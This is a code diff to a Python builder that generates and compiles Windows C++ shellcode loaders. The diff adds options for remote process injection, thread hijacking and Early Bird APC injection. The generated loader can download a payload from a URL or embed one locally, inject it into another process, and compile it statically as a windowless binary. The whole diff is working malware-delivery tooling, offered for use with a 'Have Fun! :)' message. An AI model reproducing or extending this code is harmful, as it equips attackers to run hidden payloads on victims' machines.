@@ -24,13 +24,13 @@ def build (Enumeration, Payload, ProcessName, Loader, Url):
 
     f.write(f"""\n
 #include "Libraries/{Loader}"
-
-using namespace std;
 """)
-    f.write(f"""\n
+    if Payload != "null":
+        f.write(f"""\n
 {Payload} 
 """)
     f.write(f"""\n
+using namespace std;
 int main()
 {{
     PBYTE pPayloadAddress;
@@ -46,7 +46,7 @@ int main()
     if Url != "null":
         f.write(f"""\n
     if(!FetchFileFromURLA(Url.c_str(), &pPayloadAddress, &pPayloadSize)){{
-        cout << "Failed to fetch payload" << endl;
+        printf("Failed to fetch payload");
         return 0;
     }}
 
@@ -55,17 +55,19 @@ int main()
     if Enumeration != "null":
         f.write(f"""\n
     if(!GetRemoteProcess(szProcessName, &dwProcessID, &hProcess, &hThread)){{
-        cout << "Failed to find remote process" << endl;
+        printf("Failed to find remote process");
         return 0;
     }}""" ) 
     else:
         pass
 
     f.write(f"""\n
-    if(!PayloadExecute(hProcess, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){{
-        cout << "Failed to execute payload" << endl;
+    if(!PayloadExecute(hProcess, hThread, pPayloadAddress, (SIZE_T)pPayloadSize, &InjectionAddress, &hThread)){{
+        printf("Failed to execute payload");
         return 0;
     }}
+            
+    printf("Payload Executed Successfully!\\n");
 
     return 0;
 }}
@@ -73,7 +75,7 @@ int main()
 
     f.close()
     time.sleep(2)
-    os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -O2 -w -s -o chungus main.cpp -lwininet -lws2_32 -mwindows")
+    return os.system(f"C:\\msys64\\mingw64\\bin\\g++ --static -O2 -w -s -o chungus main.cpp -lwininet -lws2_32 -mwindows")
     #result = subprocess.run(['g++', '-o', 'chungus', 'main.cpp','-lwininet', '-lws2_32', '-mwindows'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     #print(result)
 
@@ -113,6 +115,7 @@ def main():
 
     if set_payload_location() == "2":
         Url = set_url()
+        Payload = "null"
     else:
         Payload = local_payload_fetch()
         Url = "null"
@@ -124,13 +127,21 @@ def main():
         Enumeration = "null"
         ProcessName = "null"
     else:
-        pass
-              
+        Loader = set_remote_loader_type()
+        if Loader == "RemoteInjection.h":
+            Enumeration = set_enum_type()
+        elif Loader == "RemoteThreadHijacking.h":
+            Enumeration = "CreateSuspended.h"
+        elif Loader == "EarlyBirdApcInjection.h":
+            Enumeration = set_proc_creation_type() 
+    
+        ProcessName = set_process_name()
+    
     ApiMode = set_api_mode()
 
     change_header_file(Enumeration, Loader, ApiMode)
 
-    if build(Enumeration, Payload, ProcessName, Loader, Url):
+    if not build(Enumeration, Payload, ProcessName, Loader, Url):
         print(f"\nPayload Built Successfully!\nHave Fun! :)")
     else:
         print(f"\nFailed to build payload :(")
